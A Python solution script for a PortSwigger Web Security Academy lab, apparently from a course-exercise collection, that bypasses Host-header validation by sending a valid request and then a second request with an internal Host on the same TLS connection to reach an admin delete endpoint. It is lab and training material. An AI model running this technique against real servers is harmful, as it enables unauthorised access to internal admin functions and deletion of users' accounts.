"""
Lab 6: Host validation bypass via connection state attack
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack
Difficulty: Practitioner

📝 Needs two requests landing on the literal SAME TCP connection: request
#1 with a VALID Host (passes the front-end's validation), immediately
followed by request #2 with a malicious Host down that SAME connection —
the app only re-validates on the first request per connection and trusts
request #2 implicitly. This needs raw socket control (same as the request-
smuggling module) since `requests`/connection pooling won't guarantee two
specific requests share one connection.
"""

import socket
import ssl

from utils import log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
INTERNAL_TARGET = "192.168.0.1"
BURP_HOST, BURP_PORT = "127.0.0.1", 8080


def open_tls_via_burp(host, port=443, timeout=15):
    sock = socket.create_connection((BURP_HOST, BURP_PORT), timeout=timeout)
    sock.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    if b"200" not in response.split(b"\r\n", 1)[0]:
        raise ConnectionError(f"CONNECT via Burp failed: {response[:200]!r}")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=host)


def run():
    note("First get a valid session cookie + CSRF token via a normal login")
    note("(not shown here — reuse the pattern from earlier modules), then")
    note("fill them into REQUEST_2 below before running this.")

    session_cookie = "YOUR-SESSION-COOKIE"
    csrf_token = "YOUR-CSRF-TOKEN"

    request_1 = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()

    body = f"csrf={csrf_token}&username=carlos"
    request_2 = (
        f"POST /admin/delete HTTP/1.1\r\n"
        f"Host: {INTERNAL_TARGET}\r\n"
        f"Cookie: session={session_cookie}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{body}"
    ).encode()

    tls_sock = open_tls_via_burp(HOST)
    tls_sock.settimeout(8)

    tls_sock.sendall(request_1)
    r1 = tls_sock.recv(4096)
    log(f"Request 1 (valid Host) response: {r1.split(chr(13).encode())[0]!r}")

    tls_sock.sendall(request_2)
    r2 = tls_sock.recv(4096)
    log(f"Request 2 (malicious Host, same connection) response: {r2.split(chr(13).encode())[0]!r}")

    tls_sock.close()

    note("If request 2's response shows the delete succeeded rather than")
    note("being blocked for an invalid Host, the connection-state bypass")
    note("worked. If not, timing matters — both requests need to be sent")
    note("close together, before any connection-level state expires.")


if __name__ == "__main__":
    run()
